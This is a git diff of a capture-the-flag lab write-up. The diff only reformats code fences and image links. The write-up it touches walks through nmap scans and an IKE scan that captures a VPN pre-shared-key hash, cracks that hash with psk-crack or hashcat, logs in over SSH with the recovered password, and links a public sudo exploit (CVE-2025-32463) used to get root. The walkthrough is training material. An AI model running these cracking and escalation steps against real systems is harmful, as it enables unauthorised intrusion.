@@ -1,5 +1,5 @@
 ### Nmap
-```bash
+```
 nmap -sS -sV -sC -vv 10.10.11.87
 
 ot shown: 999 closed tcp ports (conn-refused)
@@ -9,7 +9,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 - UDP
-```bash
+```
 nmap -sU -sV -sC --top-ports=20 10.10.11.87 -vv
 
 ---OUTPUT---
@@ -61,7 +61,7 @@ SF:cb\x80\x91>\xbbin\x08c\x81\xb5\xecB{\x1f");
 ```
 - Netkit and isakmp?
 - on first glance with searchsploit there is an interesting RCE exploit:
-![[Pasted image 20251203185155.png]]
+![Pasted image 20251203185155](../Attachments/Pasted%20image%2020251203185155.png)
 but it doesnt work
 
 - i check isakmp and see it has something to do with ipsec. and the 500 udp response is related to IKE VPN.
@@ -87,7 +87,7 @@ IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
 87959638cc870bbe4f1aa3bfa7b024dabdf32194bfb308278b91538e2322c55de65c6f48bf7db6a74f3cbb6324f8c9659ca6ceb4b458ffdc82a0d893796f00795e7e1a34f4c841dacd71bf3df07f022fd4dde9cc9785dde6419b2d68852b6a2461fe6cc334d4cf1c79b7d5f962e79b7e91b7b3cf50d9a62b4a82ed409175b430:73c67b3abf5f93038ed166788e424f121f5da1e03d6f381c5f85797e0c6bdc374d5aa73b751431969da173dd624b2fcb3cd6ba5109c113175468196c3d24066944611bfa7bccf98ecda4a0c704eab6c385a036781310faad917417f881d01df99dc14bd78b03cb4f7eeaff2e574b0fae547c91a48785ed916d491567c376387d:9efbdf8664977c3b:52c2afacfa8bab26:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:9fb81832fa1e8ccee88aef925b2120ad60b4ac09:ee846d96d279fefd836026fafbd11e95d18fa842171d679208d0ae22fd3462e2:51816bea902eda78f88b86fbd8dcc7d371dbe5c9
 Ending ike-scan 1.9.6: 1 hosts scanned in 0.031 seconds (32.76 hosts/sec).  1 returned handshake; 0 returned notify
 ```
-![[Pasted image 20251203191040.png]]
+![Pasted image 20251203191040](../Attachments/Pasted%20image%2020251203191040.png)
 - can crack with psk-crack or hashcat:
 ```
 psk-crack -d /usr/share/wordlists/rockyou.txt hash
@@ -96,21 +96,21 @@ psk-crack -d /usr/share/wordlists/rockyou.txt hash
 
 hashcat -m 5400 hash /usr/share/wordlists/rockyou.txt
 ```
-![[Pasted image 20251203192136.png]]
+![Pasted image 20251203192136](../Attachments/Pasted%20image%2020251203192136.png)
 - We see user in the brute force scan as `ike` and we cracked the hash to a password `freakingrockstarontheroad`
 - Can ssh to target and grab user flag:
-![[Pasted image 20251203192313.png]]
+![Pasted image 20251203192313](../Attachments/Pasted%20image%2020251203192313.png)
 
 ```
 ssh ike@10.10.11.87
 ```
-![[Pasted image 20251203192336.png]]
+![Pasted image 20251203192336](../Attachments/Pasted%20image%2020251203192336.png)
 
 - With linpeas I find that sudo version is `1.9.17`
-![[Pasted image 20251203193504.png]]
+![Pasted image 20251203193504](../Attachments/Pasted%20image%2020251203193504.png)
 
 - Searching online I find a bash script exploit which I copy onto target and run it to gain root shell:https://github.com/kh4sh3i/CVE-2025-32463/blob/main/exploit.sh
-![[Pasted image 20251203193555.png]]
+![Pasted image 20251203193555](../Attachments/Pasted%20image%2020251203193555.png)
 
 - I grab root flag:
-![[Pasted image 20251203193619.png]]
+![Pasted image 20251203193619](../Attachments/Pasted%20image%2020251203193619.png)
